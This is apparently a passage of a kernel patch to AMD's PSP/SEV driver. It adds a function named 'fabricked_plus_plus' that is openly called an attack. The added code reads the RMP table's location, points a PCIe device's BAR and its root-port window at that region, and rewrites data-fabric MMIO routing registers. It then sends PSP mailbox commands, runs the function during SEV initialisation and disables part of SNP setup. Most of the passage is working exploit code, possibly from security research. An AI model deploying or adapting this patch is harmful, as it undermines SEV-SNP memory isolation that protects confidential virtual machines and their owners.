++	if (!psp || !psp->vdata || !psp->vdata->cmdresp_reg ||
++	    !psp->vdata->cmdbuff_addr_lo_reg ||
++	    !psp->vdata->cmdbuff_addr_hi_reg)
++		return -ENODEV;
++
++	cmdresp_reg = psp->io_regs + 0x10970;
++	cmdbuff_lo_reg = psp->io_regs + 0x10974;
++	cmdbuff_hi_reg = psp->io_regs + 0x10978;
++
++	mutex_lock(&psp->mailbox_mutex);
++
++	/* Ensure mailbox is ready for a command */
++	ret = -EBUSY;
++	if (psp_mailbox_poll(cmdresp_reg, cmdresp, 0))
++		goto unlock;
++
++	if (cmdbuff) {
++		iowrite32(lower_32_bits(__psp_pa(cmdbuff)), cmdbuff_lo_reg);
++		iowrite32(upper_32_bits(__psp_pa(cmdbuff)), cmdbuff_hi_reg);
++	}
++
++	union pspv2_mbox_command cmd_prep = { 0 };
++	cmd_prep.fields.mbox_command = cmd;
++	*cmdresp = cmd_prep.val;
++
++	iowrite32(*cmdresp, cmdresp_reg);
++
++	ret = psp_mailbox_poll(cmdresp_reg, cmdresp, timeout_msecs);
++
++unlock:
++	mutex_unlock(&psp->mailbox_mutex);
++
++	return ret;
++}
++
++static void read_bar_addr(struct pci_dev *pdev, int bar_offset, u64 *addr,
++			  bool *is_64bit)
++{
++	u32 bar_lo, bar_hi = 0;
++
++	pci_read_config_dword(pdev, bar_offset, &bar_lo);
++
++	*is_64bit = ((bar_lo & PCI_BASE_ADDRESS_MEM_TYPE_MASK) ==
++		     PCI_BASE_ADDRESS_MEM_TYPE_64);
++
++	if (*is_64bit) {
++		pci_read_config_dword(pdev, bar_offset + 4, &bar_hi);
++		*addr = ((u64)bar_hi << 32) |
++			(bar_lo & PCI_BASE_ADDRESS_MEM_MASK);
++	} else {
++		*addr = bar_lo & PCI_BASE_ADDRESS_MEM_MASK;
++	}
++}
++
++static void __maybe_unused read_root_port(struct pci_dev *dev, u64 *base,
++					  u64 *limit)
++{
++	struct pci_dev *root = pci_upstream_bridge(dev);
++
++	pr_info("Found bridge: %02x:%02x.%d\n", root->bus->number,
++		PCI_SLOT(root->devfn), PCI_FUNC(root->devfn));
++
++	u16 base_lower, limit_lower;
++	u32 base_upper, limit_upper;
++
++	pci_read_config_word(root, PCI_PREF_MEMORY_BASE, &base_lower);
++	pci_read_config_dword(root, PCI_PREF_BASE_UPPER32, &base_upper);
++	pci_read_config_word(root, PCI_PREF_MEMORY_LIMIT, &limit_lower);
++	pci_read_config_dword(root, PCI_PREF_LIMIT_UPPER32, &limit_upper);
++
++	pr_info("read values for lower base:limit: %hx:%hx\n", base_lower,
++		limit_lower);
++	*base = (((u64)base_upper) << 32) | (((u64)base_lower) << 16);
++	*limit = (((u64)limit_upper) << 32) | (((u64)limit_lower) << 16);
++}
++static void __maybe_unused reconfig_root_port(struct pci_dev *dev, u64 base,
++					      u64 limit)
++{
++	struct pci_dev *root = pci_upstream_bridge(dev);
++
++	pci_write_config_word(root, PCI_PREF_MEMORY_BASE, base >> 16);
++	pci_write_config_dword(root, PCI_PREF_BASE_UPPER32, base >> 32);
++	pci_write_config_word(root, PCI_PREF_MEMORY_LIMIT, limit >> 16);
++	pci_write_config_dword(root, PCI_PREF_LIMIT_UPPER32, limit >> 32);
++}
++
++static void write_bar_addr(struct pci_dev *pdev, int bar_offset, u64 new_addr,
++			   bool is_64bit)
++{
++	u16 cmd;
++	u32 bar_lo;
++
++	pci_read_config_dword(pdev, bar_offset, &bar_lo);
++
++	pci_read_config_word(pdev, PCI_COMMAND, &cmd);
++	pci_write_config_word(pdev, PCI_COMMAND, cmd & ~PCI_COMMAND_MEMORY);
++
++	pci_write_config_dword(pdev, bar_offset,
++			       (u32)(new_addr & 0xFFFFFFF0) | (bar_lo & 0xF));
++
++	if (is_64bit)
++		pci_write_config_dword(pdev, bar_offset + 4,
++				       (u32)(new_addr >> 32));
++
++	pci_write_config_word(pdev, PCI_COMMAND, cmd);
++}
++
++struct pci_dev *dev_dest;
++
++u64 old_window_base, old_window_limit, orig_bar_addr;
++static void fabricked_plus_plus(void)
++{
++	pr_info("Called fabricked++ attack fn\n");
++
++	u64 rmp_base, rmp_limit;
++	rdmsrl(MSR_AMD64_RMP_BASE, rmp_base);
++	rdmsrl(MSR_AMD64_RMP_END, rmp_limit);
++	pr_info("Base: 0x%08llx, Limit: 0x%08llx\n", rmp_base, rmp_limit);
++
++	uint64_t rmp_actual_start = rmp_base + 0x4000;
++
++	u64 self_protect_rmp = ((rmp_actual_start) << 8);
++	self_protect_rmp /= 255;
++
++
++	u32 old_base, old_limit, old_ext;
++	MmioAddressControl ctrl;
++	u32 old_dst;
++
++	pr_info("self protect is @0x%llx\n", self_protect_rmp);
++	pr_info("self protect is @0x%llx\n", self_protect_rmp & 0xfffffffffffffff8);
++	pr_info("self protect offset is @0x%llx\n", rmp_actual_start - (self_protect_rmp & 0xfffffffffffffff8));
++
++	dev_dest = pci_get_domain_bus_and_slot(0, 0xe1, PCI_DEVFN(0, 0));
++	if (!dev_dest) {
++		pr_info("squirrel dev not found\n");
++		return;
++	}
++
++	pci_set_master(dev_dest);
++	if (pci_enable_device(dev_dest)) {
++		pr_info("Not great\n");
++		return;
++	}
++	pci_enable_device_mem(dev_dest);
++
++	bool is_64bit;
++	read_bar_addr(dev_dest, 0x14, &orig_bar_addr, &is_64bit);
++	pr_info("orig bar %llx, is_64bit %d\n", orig_bar_addr, is_64bit);
++
++	read_root_port(dev_dest, &old_window_base, &old_window_limit);
++	pr_info("Bar window: 0x%llx:0x%llx", old_window_base, old_window_limit);
++	write_bar_addr(dev_dest, 0x14, rmp_base, true);
++	reconfig_root_port(dev_dest, rmp_base, rmp_base + 0x10000000);
++
++	u32 shadow_base = rmp_base >> 16;
++	u32 shadow_limit = (rmp_base + 0x10000000) >> 16;
++
++	u64 new_bar;
++	read_bar_addr(dev_dest, 0x14, &new_bar, &is_64bit);
++	pr_info("new bar %llx, is_64bit %d\n", new_bar, is_64bit);
++
++	u64 base, limit;
++	read_root_port(dev_dest, &base, &limit);
++	pr_info("Bar window: 0x%llx:0x%llx", base, limit);
++
++	u32 broadcast_base, broadcast_limit;
++	u32 target_instance = 0x20;
++	df_indirect_read(0, 0x0, 0xe70, target_instance, &broadcast_base);
++	df_indirect_read(0, 0x0, 0xe74, target_instance, &broadcast_limit);
++	pr_info("Broadcast read mapping before: 0x%x:0x%x", broadcast_base,
++		broadcast_limit);
++
++	pr_info("The target instance now is %x\n", target_instance);
++	read_mmiobase(target_instance, 15, 16);
++
++	rmp_base = 0x91900000;
++	rmp_limit = 0x9223ffff;
++
++	df_indirect_read(0, 0x0, 0xe70, target_instance, &old_base);
++	df_indirect_read(0, 0x0, 0xe74, target_instance, &old_limit);
++	df_indirect_read(0, 0x0, 0xe78, target_instance, &ctrl.value);
++	df_indirect_read(0, 0x0, 0xe7c, target_instance, &old_ext);
++
++	old_dst = ctrl.DstFabricID;
++	ctrl.DstFabricID = 0x20;
++
++
++	df_indirect_write(0, 0x0, 0xe70, target_instance, (rmp_base >> 16));
++	df_indirect_write(0, 0x0, 0xe74, target_instance, rmp_limit >> 16);
++
++	df_indirect_write(0, 0x0, 0xe78, target_instance, ctrl.value);
++	df_indirect_write(0, 0x0, 0xe7c, target_instance, 0x0);
++
++	read_mmiobase(target_instance, 15, 16);
++
++	target_instance = 0x21;
++	pr_info("The target instance now is %x\n", target_instance);
++	read_mmiobase(target_instance, 15, 16);
++
++	df_indirect_read(0, 0x0, 0xe70, target_instance, &old_base);
++	df_indirect_read(0, 0x0, 0xe74, target_instance, &old_limit);
++	df_indirect_read(0, 0x0, 0xe78, target_instance, &ctrl.value);
++	df_indirect_read(0, 0x0, 0xe7c, target_instance, &old_ext);
++
++	old_dst = ctrl.DstFabricID;
++	ctrl.DstFabricID = 0x20;
++
++
++	df_indirect_write(0, 0x0, 0xe70, target_instance, (rmp_base >> 16));
++	df_indirect_write(0, 0x0, 0xe74, target_instance, rmp_limit >> 16);
++
++	df_indirect_write(0, 0x0, 0xe78, target_instance, ctrl.value);
++	df_indirect_write(0, 0x0, 0xe7c, target_instance, 0x0);
++
++	read_mmiobase(target_instance, 15, 16);
++
++	target_instance = 0x22;
++	pr_info("The target instance now is %x\n", target_instance);
++	read_mmiobase(target_instance, 15, 16);
++
++	df_indirect_read(0, 0x0, 0xe70, target_instance, &old_base);
++	df_indirect_read(0, 0x0, 0xe74, target_instance, &old_limit);
++	df_indirect_read(0, 0x0, 0xe78, target_instance, &ctrl.value);
++	df_indirect_read(0, 0x0, 0xe7c, target_instance, &old_ext);
++
++	old_dst = ctrl.DstFabricID;
++	ctrl.DstFabricID = 0x20;
++
++	df_indirect_write(0, 0x0, 0xe70, target_instance, (rmp_base >> 16));
++	df_indirect_write(0, 0x0, 0xe74, target_instance, rmp_limit >> 16);
++
++	df_indirect_write(0, 0x0, 0xe78, target_instance, ctrl.value);
++	df_indirect_write(0, 0x0, 0xe7c, target_instance, 0x0);
++
++	read_mmiobase(target_instance, 15, 16);
++
++
++	struct psp_device *psp = psp_master;
++
++	unsigned int resp = 0;
++
++	struct psp_mbox_default_buffer buf = { .header = {
++						       .size = sizeof(buf) } };
++	int ret = custom_psp_mailbox_command(psp, 0x1B, &buf, 2000, &resp);
++
++	pr_info("LockDfReg exted with %d, response is %u, sts is %lu\n", ret,
++		resp, FIELD_GET(PSP_CMDRESP_STS, resp));
++
++	ret = custom_psp_mailbox_command(psp, 0x6, &buf, 2000, &resp);
++	pr_info("ExitBootServices exted with %d, response is %u, sts is %lu\n",
++		ret, resp, FIELD_GET(PSP_CMDRESP_STS, resp));
++
++	df_indirect_read(0, 0x0, 0xe70, 0xff, &broadcast_base);
++	df_indirect_read(0, 0x0, 0xe74, 0xff, &broadcast_limit);
++	pr_info("Broadcast read mapping before: 0x%x:0x%x", broadcast_base,
++		broadcast_limit);
++
++	pr_info("done with fabricked++ attack fn\n");
++}
++
++static void fabricked_plus_plus_cleanup(void)
++{
++	pr_info("Doing fabricked++ cleanup\n");
++	u64 new_bar, base, limit;
++	bool is_64bit;
++	write_bar_addr(dev_dest, 0x14, orig_bar_addr, true);
++
++	read_bar_addr(dev_dest, 0x14, &new_bar, &is_64bit);
++	pr_info("bar back at %llx, is_64bit %d\n", new_bar, is_64bit);
++
++	reconfig_root_port(dev_dest, old_window_base, old_window_limit);
++	read_root_port(dev_dest, &base, &limit);
++	pr_info("base & limit of found root port are back at %08llx:%08llx\n",
++		base, limit);
++}
++
+ static int __sev_snp_init_locked(int *error, unsigned int max_snp_asid)
+ {
++	pr_info("Doing __sev_snp_init_locked\n");
+ 	struct psp_device *psp = psp_master;
+ 	struct sev_data_snp_init_ex data;
+ 	struct sev_device *sev;
+@@ -1435,8 +1929,8 @@ static int __sev_snp_init_locked(int *error, unsigned int max_snp_asid)
+ 		}
+ 
+ 		data.init_rmp = 1;
+-		data.list_paddr_en = 1;
+-		data.list_paddr = __psp_pa(snp_range_list);
++		//data.list_paddr_en = 1;
++		//data.list_paddr = __psp_pa(snp_range_list);
+ 
+ 		data.tio_en = tio_supp && sev_tio_enabled && amd_iommu_sev_tio_supported();
+ 
+@@ -1932,6 +2426,9 @@ static int sev_get_api_version(void)
+ 	sev->api_minor = status.api_minor;
+ 	sev->build = status.build;
+ 
++	pr_info("SEV API VERSION: %hhu.%hhu.%hhu\n", sev->api_major,
++		sev->api_minor, sev->build);
++
+ 	return 0;
+ }
+ 
+@@ -2907,6 +3404,8 @@ void sev_pci_init(void)
+ 
+ 	psp_timeout = psp_probe_timeout;
+ 
++	fabricked_plus_plus();
++
+ 	if (sev_get_api_version())
+ 		goto err;
+ 
+diff --git a/include/linux/psp-sev.h b/include/linux/psp-sev.h
+index 69ffa4b4d1fa..1477e068d6fe 100644
+--- a/include/linux/psp-sev.h
++++ b/include/linux/psp-sev.h
+@@ -226,6 +226,23 @@ struct sev_data_download_firmware {
+ 	u32 len;				/* In */
+ } __packed;
+ 
++/**
++ * struct sev_data_download_firmware_ex - DOWNLOAD_FIRMWARE_EX command parameters
++ *
++ * @length: length of this command buffer
++ * @address: physical address of firmware image
++ * @len: len of the firmware image
++ * @commit: automatically commit the newly installed image
++ */
++struct sev_data_download_firmware_ex {
++	u32 cmdlen;				/* In */
++	u32 reserved;				/* in */
++	u64 address;				/* In */
++	u32 len;				/* In */
++	u32 commit:1; 				/* In */
++	u32 reserved2:31;			/* In */
++} __packed;
++
+ /**
+  * struct sev_data_get_id - GET_ID command parameters
+  *
+@@ -875,6 +892,15 @@ struct sev_data_snp_feature_info {
+ 	u64 feature_info_paddr;
+ } __packed;
+ 
++struct sev_data_snp_page_move{
++    u64 guest_physical_addr;
++    u32 page_size : 1;
++    u32 reserved : 31;
++    u32 reserved1;
++    u64 src_paddr;
++    u64 dst_paddr;
++} __packed;
++
+ /**
+  * struct feature_info - FEATURE_INFO structure
+  *
